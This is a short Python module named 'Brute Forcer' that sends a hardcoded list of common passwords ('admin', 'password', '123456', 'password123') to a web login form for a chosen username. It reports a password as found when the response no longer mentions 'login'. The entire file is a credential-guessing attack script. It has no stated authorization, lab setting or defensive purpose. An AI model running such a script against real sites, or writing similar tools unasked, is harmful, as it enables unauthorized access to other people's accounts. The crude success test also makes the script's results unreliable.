"""
Brute Forcer Module
"""
import requests

class BruteForcer:
    def __init__(self, url, username):
        self.url = url
        self.username = username
        self.passwords = ['admin', 'password', '123456', 'password123']
    
    def start(self):
        print(f"\n[*] Testing passwords for user: {self.username}")
        
        for password in self.passwords:
            print(f"[*] Trying: {password}")
            # This is a template - modify based on actual form
            data = {'username': self.username, 'password': password}
            
            try:
                response = requests.post(self.url, data=data, timeout=3)
                if "login" not in response.text.lower():
                    print(f"[+] Password found: {password}")
                    return
            except:
                pass
        
        print("\n[-] No matching password found")
